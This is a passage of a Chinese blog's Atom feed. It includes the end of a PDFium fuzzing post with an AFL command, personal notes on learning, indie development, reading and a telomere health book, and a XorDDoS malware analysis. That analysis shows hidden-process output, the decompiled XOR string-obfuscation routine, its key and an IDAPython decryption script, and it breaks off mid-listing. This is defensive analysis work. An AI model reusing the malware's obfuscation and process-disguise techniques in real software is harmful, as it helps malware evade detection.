b/afl-fuzz.c</span></span><br><span class="line"><span class="meta">@@ -23,7 +23,9 @@</span></span><br><span class="line"> #define AFL_MAIN</span><br><span class="line"> #define MESSAGES_TO_STDOUT</span><br><span class="line"> </span><br><span class="line"><span class="addition">+#ifndef _GNU_SOURCE</span></span><br><span class="line"> #define _GNU_SOURCE</span><br><span class="line"><span class="addition">+#endif</span></span><br><span class="line"> #define _FILE_OFFSET_BITS 64</span><br><span class="line"> </span><br><span class="line"> #include &quot;config.h&quot;</span><br><span class="line"><span class="comment">diff --git a/types.h b/types.h</span></span><br><span class="line"><span class="comment">index 784d3a7a286d..d24d1fdd97e8 100644</span></span><br><span class="line"><span class="comment">--- a/types.h</span></span><br><span class="line"><span class="comment">+++ b/types.h</span></span><br><span class="line"><span class="meta">@@ -78,7 +78,7 @@</span> typedef int64_t  s64;</span><br><span class="line"> #define STRINGIFY(x) STRINGIFY_INTERNAL(x)</span><br><span class="line"> </span><br><span class="line"> #define MEM_BARRIER() \</span><br><span class="line"><span class="deletion">-  asm volatile(&quot;&quot; ::: &quot;memory&quot;)</span></span><br><span class="line"><span class="addition">+  __asm__ volatile(&quot;&quot; ::: &quot;memory&quot;)</span></span><br><span class="line"> </span><br><span class="line"> #define likely(_x)   __builtin_expect(!!(_x), 1)</span><br><span class="line"> #define unlikely(_x)  __builtin_expect(!!(_x), 0)</span><br></pre></td></tr></table></figure><p>afl-fuzz 的使用和其他项目一样。初始的种子文件有几个地方可以获取：</p><ul><li><a href="https://pdfium.googlesource.com/pdfium/+/refs/heads/master/testing/resources/">https://pdfium.googlesource.com/pdfium/+/refs/heads/master/testing/resources/</a></li><li><a href="https://github.com/mozilla/pdf.js/tree/master/test/pdfs">https://github.com/mozilla/pdf.js/tree/master/test/pdfs</a></li></ul><p><code>./afl-fuzz -M 01 -m 1024 -i /home/henices/input -o /home/henices/out -x /tmp/pdf.dict -- ./pdfium_test @@</code></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://mariomalwareanalysis.blogspot.com/2012/02/how-to-embed-javascript-into-pdf.html">https://mariomalwareanalysis.blogspot.com/2012/02/how-to-embed-javascript-into-pdf.html</a></li><li><a href="https://www.blackhat.com/docs/asia-17/materials/asia-17-Liu-Dig-Into-The-Attack-Surface-Of-PDF-And-Gain-100-CVEs-In-1-Year.pdf">https://www.blackhat.com/docs/asia-17/materials/asia-17-Liu-Dig-Into-The-Attack-Surface-Of-PDF-And-Gain-100-CVEs-In-1-Year.pdf</a></li><li><a href="https://chromium.googlesource.com/chromium/src/+/master/testing/libfuzzer/getting_started.md">https://chromium.googlesource.com/chromium/src/+/master/testing/libfuzzer/getting_started.md</a></li><li><a href="https://chromium.googlesource.com/chromium/src/+/master/testing/libfuzzer/efficient_fuzzer.md">https://chromium.googlesource.com/chromium/src/+/master/testing/libfuzzer/efficient_fuzzer.md</a></li><li><a href="https://chromium.googlesource.com/chromium/src/+/master/testing/libfuzzer/reproducing.md">https://chromium.googlesource.com/chromium/src/+/master/testing/libfuzzer/reproducing.md</a></li><li><a href="https://fuzzing-project.org/tutorial2.html">https://fuzzing-project.org/tutorial2.html</a></li><li><a href="https://blog.chromium.org/2012/04/fuzzing-for-security.html">https://blog.chromium.org/2012/04/fuzzing-for-security.html</a></li><li><a href="https://chromium.googlesource.com/chromium/src/+/lkcr/docs/linux_debugging.md">https://chromium.googlesource.com/chromium/src/+/lkcr/docs/linux_debugging.md</a></li><li><a href="https://web.archive.org/web/20141010035745/http://gnupdf.org/Introduction_to_PDF">https://web.archive.org/web/20141010035745/http://gnupdf.org/Introduction_to_PDF</a></li><li><a href="https://mariomalwareanalysis.blogspot.com/2012/02/how-to-manually-create-pdf.html">https://mariomalwareanalysis.blogspot.com/2012/02/how-to-manually-create-pdf.html</a></li><li><a href="https://mariomalwareanalysis.blogspot.com/2012/02/how-to-embed-javascript-into-pdf.html">https://mariomalwareanalysis.blogspot.com/2012/02/how-to-embed-javascript-into-pdf.html</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;下载源码&quot;&gt;&lt;a href=&quot;#下载源码&quot; class=&quot;headerlink&quot; title=&quot;下载源码&quot;&gt;&lt;/a&gt;下载源码&lt;/h2&gt;&lt;p&gt;先在 &lt;a href=&quot;https://pdfium.googlesource.com/pdfium/&quot;&gt;https://p</summary>
      
    
    
    
    <category term="Security" scheme="http://usmacd.com/categories/Security/"/>
    
    
    <category term="Security" scheme="http://usmacd.com/tags/Security/"/>
    
  </entry>
  
  <entry>
    <title>Learn In Public 摘要</title>
    <link href="http://usmacd.com/en/learn_in_public/"/>
    <id>http://usmacd.com/en/learn_in_public/</id>
    <published>2023-11-01T15:05:19.059Z</published>
    <updated>2023-11-01T15:05:19.059Z</updated>
    
    <content type="html"><![CDATA[<p>a habit of creating <strong>learning exhaust</strong>  </p><ul><li>Write blogs and tutorials and cheatsheets.  </li><li>Speak at meetups and conferences.  </li><li>Ask and answer things on Stackoverflow or Reddit.  <ul><li>Avoid the walled gardens like Slack and Discord, they’re not public.</li></ul></li><li>Make Youtube videos or Twitch streams.  </li><li>Start a newsletter.  </li><li>Draw cartoons (people loooove cartoons!)</li></ul><p>Whatever your thing is, make the thing you wish you had found when you were learning.  </p><ul><li><strong>Don’t judge your results by “claps” or retweets or stars or upvotes</strong></li></ul><p>Oh you think you’re done? Don’t stop there:  </p><ul><li>Enjoyed a coding video? Reach out to the speaker&#x2F;instructor and thank them, and ask questions.  </li><li>Make PR’s to libraries you use.  </li><li>Make your own libraries no one will ever use.  </li><li>Clone stuff you like, from scratch, to see how they work.  </li><li>Teach workshops.  </li><li>Go to conferences and summarize what you learned.</li></ul><p>The subheading under this rule would be: <strong>Try your best to be right, but don’t worry when you’re wrong.</strong>  </p><ul><li>People think you suck? Good. You agree. Ask them to explain, in detail, why you suck  </li><li>You want to just feel good or you want to <strong>be</strong> good?  <ul><li>Then go away and prove them wrong. Of course, if they get abusive block them.</li></ul></li></ul><p>At some point you’ll get some support behind you. People notice genuine learners. They’ll want to help you.  </p><ul><li>Don’t tell them, but they just became your mentors.  </li><li>This is very important: Pick up what they put down  </li><li>Because you learn in public. By teaching you, they teach many.</li></ul><p>source: <a href="https://www.swyx.io/learn-in-public/">https://www.swyx.io/learn-in-public/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;a habit of creating &lt;strong&gt;learning exhaust&lt;/strong&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Write blogs and tutorials and cheatsheets.  &lt;/li&gt;
&lt;li&gt;Speak at meetu</summary>
      
    
    
    
    
    <category term="PKM" scheme="http://usmacd.com/tags/PKM/"/>
    
  </entry>
  
  <entry>
    <title>图拉鼎谈独立开发</title>
    <link href="http://usmacd.com/cn/tulading/"/>
    <id>http://usmacd.com/cn/tulading/</id>
    <published>2023-10-31T16:00:00.000Z</published>
    <updated>2023-10-31T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>独立开发</p><ul><li>长期维护产品：消费者愿意为长期维护的产品买单，旧产品没有添加新功能也用新工具链重新编译一次</li><li>只开发自己使用的产品：评估未来几年自己是否使用产品，作为是否启动产品开发的重要因素</li><li>外包 + 独立开发 双驱动<ul><li>用外包的收入平滑独立开发的收入波动</li><li>在产品开发瓶颈期，利用外包刺激，打开思路</li></ul></li></ul><p>项目管理</p><ul><li>立项流程: 先记下 idea，冷却一段时间后如果有思路就继续完善一下 idea，直到某天还是想做，接着就开始动手</li><li>没有市场分析，没有用户分析，只有分阶段完成的 1.0、2.0 … 版本</li><li>1.0 版本为自己开发，只开发最核心的功能，2-n 通过用户的反馈完善产品</li></ul><p>工作模式</p><ul><li>充分利用灵活性，在家和在外工作的时间大致是 2:1</li><li>定期与设计师碰头，每周2-3 次</li></ul><p>状态管理</p><ul><li>有多少状态做多少事，即使状态不太好，也需要做事。</li><li>外部环境对状态有影响，可以利用图书馆等场所，将自己带入状态。</li></ul><p>时间管理（自律）</p><ul><li>曾经经历工作混乱的时期，现在严格工作时间登记，自己开发系统完成工作时间登记。</li><li>自律还包括定期 Review (日报、周报)，计划管理，保持自己的开发节奏。</li><li>工作日基本都工作和上班无差异，除非遇上紧急的事。</li></ul><p>好奇心</p><ul><li>喜欢新技术，喜欢新产品，喜欢折腾 (ubuntu Tweak)</li></ul><p>敏感度</p><ul><li>独立开发者，需要通过社交媒体、邮件列表、newsletter 连接外部世界，保持对新事物的敏感度</li></ul><p>听完 podcast，我发现图拉鼎非常强调工作和兴趣的匹配度，这可能就是他能长期维护产品的一个重要原因。</p><p>reference: <a href="https://pca.st/5v33uy2z">https://pca.st/5v33uy2z</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;独立开发&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;长期维护产品：消费者愿意为长期维护的产品买单，旧产品没有添加新功能也用新工具链重新编译一次&lt;/li&gt;
&lt;li&gt;只开发自己使用的产品：评估未来几年自己是否使用产品，作为是否启动产品开发的重要因素&lt;/li&gt;
&lt;li&gt;外包 + 独立开发 双驱动</summary>
      
    
    
    
    
    <category term="Programming" scheme="http://usmacd.com/tags/Programming/"/>
    
  </entry>
  
  <entry>
    <title>尤雨溪谈成功和运气</title>
    <link href="http://usmacd.com/cn/youyuxi/"/>
    <id>http://usmacd.com/cn/youyuxi/</id>
    <published>2023-10-31T16:00:00.000Z</published>
    <updated>2023-10-31T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>1）运气很重要，时势造英雄<br>在适当的时间节点上推出合适的产品能大幅提高成功的概率<br>2）真正的关键点，不在写程序上<br>重要的是判断需求，制定合适的技术方案去满足客户的需求<br>3）成功需要市场直觉和产品上的判断力<br>4）光有能力或者光有运气都很难成功<br>运气是客观存在的，But there’s nothing we can do about it.<br>5）我们只能提高自己能力，多尝试，每次尝试运气都不一样<br>6）独立开发重要的不是技术的优劣，而是如何开发一个产品的问题</p><ul><li>如何快速匹配市场需求</li><li>如何识别目标客户</li><li>如何快速验证商业模式</li><li>如何快速推向市场。</li><li>考验的是运营能力、合理分配资源的能力，简化创业流程的能力</li></ul><p>reference: <a href="https://pca.st/yjf05b7i">https://pca.st/yjf05b7i</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;1）运气很重要，时势造英雄&lt;br&gt;在适当的时间节点上推出合适的产品能大幅提高成功的概率&lt;br&gt;2）真正的关键点，不在写程序上&lt;br&gt;重要的是判断需求，制定合适的技术方案去满足客户的需求&lt;br&gt;3）成功需要市场直觉和产品上的判断力&lt;br&gt;4）光有能力或者光有运气都很难成功&lt;b</summary>
      
    
    
    
    
    <category term="Programming" scheme="http://usmacd.com/tags/Programming/"/>
    
  </entry>
  
  <entry>
    <title>万维钢的强力研读笔记法</title>
    <link href="http://usmacd.com/cn/qiangliyandu/"/>
    <id>http://usmacd.com/cn/qiangliyandu/</id>
    <published>2023-09-24T16:00:00.000Z</published>
    <updated>2023-09-24T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>清晰表达每一章的逻辑脉络</p><ul><li>按照书籍的章节给笔记划分章节，用自己的话写出每一个章节的内容，各章内容串联起来就成了整本书的内容提要</li><li>最重要的是理清作者的逻辑脉络，每一章的逻辑结构可能就几句话，却可能分散在大几十页的内容中</li></ul><p>带走书中的所有亮点</p><ul><li>读书不是划线式的重点内容总结，而应该注意让你拍案叫绝，点醒梦中人，这些可以刺激改变你的思维的内容</li></ul><p>大量自己的看法和心得</p><ul><li>强力研读是主动式的读书，你需要写下自己对一段内容或一句话的理解</li><li>你可以质疑或者肯定作者的看法，也可以写下自己阅读时的灵感</li><li>在写读书笔记的过程中，你可能突然解决了一个你以前关注的问题，也可能想到了书中思想一个应用场景</li><li>这些灵感都相当宝贵，转瞬即逝，一定要将把他们记录下来</li></ul><p>发现本书和其他书籍文章的联系</p><ul><li>极少书的思想是独立与世界的，大多新知识都是建立在旧知识的基础上的</li><li>同一问题，不同书籍的作者的看法有什么不同之处，有没有新的论据支持或者反对他们的看法</li></ul><p>好书需要至少阅读两遍</p><ul><li>第一遍是为了陷进去，第二遍是为了跳出来</li><li>第一遍阅读可能对领域内容不太熟悉，全部带宽都要用于理解作者的思想。</li><li>想法只有在带宽剩余时，才可能冒出来。为了最有价值的心得、灵感和联系，对好书我们至少阅读两遍</li><li>笔记是对好书最好的敬意，笔记不是书评，它是个人知识的延伸</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;清晰表达每一章的逻辑脉络&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;按照书籍的章节给笔记划分章节，用自己的话写出每一个章节的内容，各章内容串联起来就成了整本书的内容提要&lt;/li&gt;
&lt;li&gt;最重要的是理清作者的逻辑脉络，每一章的逻辑结构可能就几句话，却可能分散在大几十页的内容中&lt;/li&gt;
&lt;</summary>
      
    
    
    
    
    <category term="PKM" scheme="http://usmacd.com/tags/PKM/"/>
    
  </entry>
  
  <entry>
    <title>端粒效应</title>
    <link href="http://usmacd.com/cn/living_younger_healthier_logger/"/>
    <id>http://usmacd.com/cn/living_younger_healthier_logger/</id>
    <published>2023-09-12T16:00:00.000Z</published>
    <updated>2023-09-12T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>获得 2009 年诺贝尔生理或医学奖的 伊丽莎白·布莱克本在 《端粒效应》一书中说明：人只所以变老，是由于某些细胞不再更新了，而细胞分裂更新的限制在于 “端粒”。</p><p>端粒是染色体末端的 DNA 序列，在细胞分裂过程中，端粒起到保护 DNA 序列的作用。所以，人之所变老的本质原因是 「端粒变短」。</p><p>影响端粒变短的因素</p><ul><li>思想压力：研究表明长期照顾患病小孩的母亲，端粒长度较正常人变短</li><li>敌意：看哪儿都不对，和周围的人关系极差</li><li>悲观：对事情总有一个负面的预期</li><li>胡思乱想：抑郁，都是乱想负面的东西，觉得不公平对待</li></ul><p>缓解负面情绪的方法</p><ul><li>把压力视为挑战：对压力的反应是威胁还是挑战，决定压力的性质</li><li>专注力训练：冥想</li><li>找到人生的目标：find something bigger than yourself</li></ul><p>锻炼对端粒的好处</p><ul><li>人体是反脆弱系统：锻炼的本质是对身体的适度打击</li><li>细胞的反击：适度的锻炼能使端粒变长，并增加「自由基」</li><li>抗氧化剂增多：突然增多的自由基使得身体增加抗氧化剂，锻炼改变了自由基和抗氧化剂的平衡</li><li>锻炼到底是影响端粒还是端粒脢，分子生物学上的机制科学家现在还不知道</li></ul><p>两种科学的锻炼方法</p><ul><li>有氧耐力训练：长跑，每次跑四十五分钟，每周跑三次，坚持六个月，你的端粒酶的活性就能提高两倍</li><li>高强度的间歇训练：短跑结合恢复的办法，快跑几分钟，停下来慢走休息，然后再快跑</li></ul><p>节食和减肥的观念</p><ul><li>体重可能并不是肥胖的最好指标，更好的指标是 「腰臀比」</li><li>肚子大代表新陈代谢水平低，会让端粒变短</li><li>肚子大，腰臀比过高，胆固醇超标；高血压；胰岛素抵抗，具备三个就是新陈代谢综合症</li><li>饥饿节食减肥不可取，就算减下体重也很容易报复性反弹</li><li>糖可能是各种健康问题的罪魁祸首</li></ul><p>从端粒说，细胞有三个敌人</p><ul><li>细胞发炎：肥胖使细胞容易发炎，从而使端粒变短。omega-3 可以防止细胞发炎，鱼类、牛奶、有机鸡蛋中含有 omega-3 脂肪酸</li><li>氧化应激反应：维生素 C 和维生素 E 可以对抗氧化应急反应。饮食中可以吃些水果、胡萝卜、西红柿、土豆和绿叶蔬菜</li><li>胰岛素抵抗：对抗胰岛素抵抗，关键是要少吃糖</li></ul><p>从看端粒的角度分析饮食</p><ul><li>对端粒有害的食物有：红肉，加工肉类（香肠）、白面包、含糖饮料、omega-6 ，过量饮酒</li><li>对端粒有益的食物有：植物纤维、全麦、蔬菜、坚果、豆类、水果、海带、omega-3</li></ul><p>人的环境对端粒的影响</p><ul><li>城市的居民比乡村居民更容易视压力为威胁，因为城市居民的“杏仁核” 部位比较活跃，这个部位主要负责恐惧感</li><li>社会关系比金钱对端粒的影响更大，只要能满足基本的生活需求，金钱对端粒的影响就不大</li><li>受教育的程度对端粒影响很大，研究表明受教育程度越高端粒越长</li><li>职业很重要比收入对端粒影响大，一个从事基本工作的白领也比收入更高的蓝领端粒要长</li></ul><p>从端粒看，父母对孩子的影响</p><ul><li>遗传：端粒长度可以不通过基因遗传，而是“直接传递”，怀孕时父母的端粒比较短，孩子出生时端粒也就比较短</li><li>孕期压力：怀孕期间母亲的压力情况，人遇到压力会分泌皮质醇，从而影响孩子的端粒</li><li>家庭环境：越少父母的关爱，被父母忽视的孩子，端粒会比较短</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;获得 2009 年诺贝尔生理或医学奖的 伊丽莎白·布莱克本在 《端粒效应》一书中说明：人只所以变老，是由于某些细胞不再更新了，而细胞分裂更新的限制在于 “端粒”。&lt;/p&gt;
&lt;p&gt;端粒是染色体末端的 DNA 序列，在细胞分裂过程中，端粒起到保护 DNA 序列的作用。所以，人之</summary>
      
    
    
    
    
    <category term="Life" scheme="http://usmacd.com/tags/Life/"/>
    
  </entry>
  
  <entry>
    <title>xorddos 样本进程隐藏的小伎俩</title>
    <link href="http://usmacd.com/cn/xorddos_hide/"/>
    <id>http://usmacd.com/cn/xorddos_hide/</id>
    <published>2023-09-06T03:00:51.915Z</published>
    <updated>2023-09-06T03:00:51.915Z</updated>
    
    <content type="html"><![CDATA[<h2 id="进程隐藏"><a href="#进程隐藏" class="headerlink" title="进程隐藏"></a>进程隐藏</h2><p>上周由于工作原因接触到xorddos的样本，这个样本在过去一年的时间里非常常见，<br>变种也很多，拿到的样本比较有趣的是 ps 无法发现进程。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># ps -ef  | grep /usr/bin</span></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">root      4597  4594  0 00:37 ?        00:00:00 gnome-pty-helper</span><br><span class="line">root      4598  4594  0 00:37 pts/1    00:00:00 bash</span><br><span class="line">oracle    5359     1  0 00:41 ?        00:00:00 ora_smco_orcl</span><br><span class="line">oracle    5378     1  0 00:41 ?        00:00:00 ora_w000_orcl</span><br><span class="line">oracle    5586     1  0 00:42 ?        00:00:00 ora_j000_orcl</span><br><span class="line">oracle    5588     1  0 00:42 ?        00:00:00 ora_j001_orcl</span><br><span class="line">root      5666     1  0 00:43 ?        00:00:00 sh</span><br><span class="line">root      5669     1  0 00:43 ?        00:00:00 <span class="built_in">echo</span> <span class="string">&quot;find&quot;</span></span><br><span class="line">root      5672     1  0 00:43 ?        00:00:00 <span class="built_in">ls</span> -la</span><br><span class="line">root      5675     1  0 00:43 ?        00:00:00 bash</span><br><span class="line">root      5678     1  0 00:43 ?        00:00:00 gnome-terminal</span><br><span class="line">root      5683     1  0 00:43 ?        00:00:00 <span class="built_in">cd</span> /etc</span><br><span class="line">root      5686     1  0 00:43 ?        00:00:00 top</span><br><span class="line">root      5689     1  0 00:43 ?        00:00:00 sh</span><br><span class="line">root      5692     1  0 00:43 ?        00:00:00 gnome-terminal</span><br><span class="line">root      5695     1  0 00:43 ?        00:00:00 ifconfig</span><br><span class="line">root      5696  4598  0 00:43 pts/1    00:00:00 ps -ef</span><br></pre></td></tr></table></figure><p>而使用lsof却可以清除地看见样本正在努力地干活。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># lsof +d /usr/bin</span></span><br><span class="line">COMMAND    PID USER  FD   TYPE DEVICE    SIZE    NODE NAME</span><br><span class="line">hidd      1853 root txt    REG    3,1   33708 2467454 /usr/bin/hidd</span><br><span class="line">ckucbzknt 2014 root txt    REG    3,1  610331 2459176 /usr/bin/ckucbzkntb</span><br><span class="line">xfs       2143  xfs txt    REG    3,1  107460 2468483 /usr/bin/xfs</span><br><span class="line">Xorg      3117 root txt    REG    3,1 1890596 2466732 /usr/bin/Xorg</span><br><span class="line">gnome-ses 4073 root txt    REG    3,1  129356 2459482 /usr/bin/gnome-session</span><br><span class="line">ssh-agent 4201 root txt    REG    3,1   88996 2467513 /usr/bin/ssh-agent</span><br><span class="line">dbus-laun 4245 root txt    REG    3,1   23796 2471600 /usr/bin/dbus-launch</span><br><span class="line">gnome-key 4255 root txt    REG    3,1   97396 2473617 /usr/bin/gnome-keyring-daemon</span><br><span class="line">metacity  4290 root txt    REG    3,1  521080 2464500 /usr/bin/metacity</span><br><span class="line">gnome-pan 4296 root txt    REG    3,1  540868 2465177 /usr/bin/gnome-panel</span><br><span class="line">nautilus  4298 root txt    REG    3,1 1348932 2461620 /usr/bin/nautilus</span><br><span class="line">gnome-vol 4310 root txt    REG    3,1   65240 2464498 /usr/bin/gnome-volume-manager</span><br><span class="line">bt-applet 4334 root txt    REG    3,1   30452 2464773 /usr/bin/bt-applet</span><br><span class="line">nm-applet 4352 root txt    REG    3,1  312432 2467723 /usr/bin/nm-applet</span><br><span class="line">gnome-pow 4381 root txt    REG    3,1  195284 2459473 /usr/bin/gnome-power-manager</span><br><span class="line">pam-panel 4383 root txt    REG    3,1   39148 2461862 /usr/bin/pam-panel-icon</span><br><span class="line">dbus-laun 4473 root txt    REG    3,1   23796 2471600 /usr/bin/dbus-launch</span><br><span class="line">gnome-scr 4512 root txt    REG    3,1  168628 2468487 /usr/bin/gnome-screensaver</span><br><span class="line">gnome-ter 4594 root txt    REG    3,1  309368 2464648 /usr/bin/gnome-terminal</span><br><span class="line">gadcgkcqn 4681 root txt    REG    3,1  610331 2460159 /usr/bin/gadcgkcqni</span><br><span class="line">gadcgkcqn 4684 root txt    REG    3,1  610331 2460159 /usr/bin/gadcgkcqni</span><br><span class="line">gadcgkcqn 4687 root txt    REG    3,1  610331 2460159 /usr/bin/gadcgkcqni</span><br><span class="line">gadcgkcqn 4690 root txt    REG    3,1  610331 2460159 /usr/bin/gadcgkcqni</span><br><span class="line">gadcgkcqn 4693 root txt    REG    3,1  610331 2460159 /usr/bin/gadcgkcqni</span><br></pre></td></tr></table></figure><p>阅读汇编代码，分析具体原因，发现xorddos将一些关键信息加密了，F5处理过的代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">encrypt_code</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v2; <span class="comment">// ecx@2</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a2 &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      *(_BYTE *)(v2 + a1) ^= xorkeys[(((_BYTE)v2 + ((<span class="type">unsigned</span> <span class="type">int</span>)(v2 &gt;&gt; <span class="number">31</span>) &gt;&gt; <span class="number">28</span>)) &amp; <span class="number">0xF</span>)</span><br><span class="line">                                   - ((<span class="type">unsigned</span> <span class="type">int</span>)(v2 &gt;&gt; <span class="number">31</span>) &gt;&gt; <span class="number">28</span>)];</span><br><span class="line">      ++v2;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v2 != a2 );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> a1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>xorkey 为 BB2FA36AAA9541F0</p><p>用idapython 写个小脚本，简单处理一下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> idautils <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> idc <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_string</span>(<span class="params">addr</span>):</span><br><span class="line">  out = <span class="string">&quot;&quot;</span></span><br><span class="line">  <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">if</span> Byte(addr) != <span class="number">0</span>:</span><br><span class="line">      out += <span class="built_in">chr</span>(Byte(addr))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    addr += <span class="number">1</span></span><br><span class="line">  <span class="keyword">return</span> out</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">data</span>):</span><br><span class="line"></span><br><span class="line">  xorkey = <span class="string">&#x27;BB2FA36AAA9541F0&#x27;</span></span><br><span class="line">  length = <span class="built_in">len</span>(data)</span><br><span class="line">  o = <span class="string">&quot;&quot;</span></span><br><span class="line">  <span class="keyword">if</span> length &gt; <span class="number">0</span>:</span><br><span class="line">    v2 = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> v2 &lt; length:</span><br><span class="line">      o += <span class="built_in">chr</span>( <span class="built_in">ord</span>(data[v2]) ^  <span class="built_in">ord</span>(xorkey[((v2 + ((v2 &gt;&gt; <span class="number">31</span>) &gt;&gt; <span class="number">28</span>)) &amp; <span class="number">0xF</span>) - ( (v2 &gt;&gt; <span class="number">31</span>) &gt;&gt; <span class="number">28</span>)]) )</span><br><span class="line">      v2 += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> o</span><br><span class="line"></span><br><span class="line">ea = ScreenEA()</span><br><span class="line">string = get_string(ea)</span><br><span class="line">dec = decrypt(string)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;Addr: 0x%x, %s&#x27;</span> % (ea, dec)</span><br><span class="line">MakeComm(ea, dec)</span><br></pre></td></tr></table></figure><p>处理后可以看到伪装的命令行信息，daemonname。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">.data:080CBB40 daemonname      db &#x27;!#Ff3VE.-7&#x27;,17h,&#x27;V[_ 0&#x27;,0 ; DATA XREF: main+31Eo</span><br><span class="line">.data:080CBB40                                         ; main+4AEo ...</span><br><span class="line">.data:080CBB40                                         ; cat resolv.conf</span><br><span class="line">.data:080CBB51                 align 4</span><br><span 